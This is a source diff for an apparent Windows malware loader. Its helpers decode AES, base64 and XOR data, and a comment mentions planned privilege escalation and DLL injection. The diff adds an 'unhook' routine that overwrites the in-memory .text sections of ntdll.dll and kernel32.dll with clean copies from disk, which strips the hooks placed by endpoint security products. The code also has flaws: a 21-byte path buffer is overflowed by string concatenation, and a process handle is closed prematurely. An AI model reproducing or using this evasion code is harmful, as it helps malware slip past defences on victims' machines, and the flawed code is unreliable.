@@ -1,6 +1,7 @@
 #include <iostream>
 #include <Windows.h>
 #include <TlHelp32.h>
+#include <psapi.h>
 #include <vector>
 #include "aes.hpp"
 #include "base64.h"
@@ -214,10 +215,81 @@ std::string XOR(std::string decoded, std::string xorKey)
     return decoded;
 }
 
+void unhook(char* modulePath, char* oriModulePath, const char* moduleName, HANDLE process) {
+    MODULEINFO mi = {};
+    HMODULE ntdllModule = GetModuleHandleA(moduleName);
+    lstrcatA(modulePath, moduleName);
+
+    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
+    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
+    HANDLE ntdllFile = CreateFileA(modulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
+
+    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
+    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
+
+    //cout << "[REFRESH] Copying PE sections into memory " << modulePath << endl;
+    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
+        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
+
+        if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
+            DWORD oldProtection = 0;
+            bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
+            memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
+            isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
+        }
+    }
+
+    // this would still require a PE relocation but will do this later
+    // ----
+    // Step 3: Calculate relocations
+    // ----
+    // refer here https://github.com/rsmudge/unhook-bof/blob/master/src/refresh.c
+
+    memset(modulePath, 0, strlen(modulePath));
+    memcpy(modulePath, oriModulePath, strlen(oriModulePath));
+    CloseHandle(process);
+    CloseHandle(ntdllFile);
+    CloseHandle(ntdllMapping);
+    FreeLibrary(ntdllModule);
+}
+
 int main()
 {
     //implement privilege escalation here
     //https://github.com/KooroshRZ/Windows-DLL-Injector/blob/61f30f3a9750600d09a19761515892e4582ec434/Injector/src
+
+    // this is to iterate all modules loaded by the loader
+    /*
+#ifdef _M_IX86
+    PEB * ProcEnvBlk = (PEB *) __readfsdword(0x30);
+#else
+    PEB* ProcEnvBlk = (PEB *)__readgsqword(0x60);
+#endif
+    PEB_LDR_DATA* Ldr = ProcEnvBlk->Ldr;
+    LIST_ENTRY* ModuleList = NULL;
+    ModuleList = &Ldr->InMemoryOrderModuleList;
+    LIST_ENTRY* pStartListEntry = ModuleList->Flink;
+
+    for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink)
+    {
+        LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
+        if (lstrcmpiW(pEntry->BaseDllName.Buffer, L"ntdll.dll") == 0)
+        {
+            printf("%p %wZ\n", &pEntry->DllBase, &pEntry->BaseDllName);
+        }
+    }
+    */
+
+    //unhook all dlls
+    HANDLE process = GetCurrentProcess();
+    char fullModulePath[21];
+    char modulePath[] = { 'c',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\\',0 };
+    memcpy(fullModulePath, modulePath, strlen(modulePath));
+
+    unhook(fullModulePath, modulePath, "ntdll.dll", process);
+    unhook(fullModulePath, modulePath, "kernel32.dll", process);
 
     // Disallow non-MSFT signed DLL's from injecting
     PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
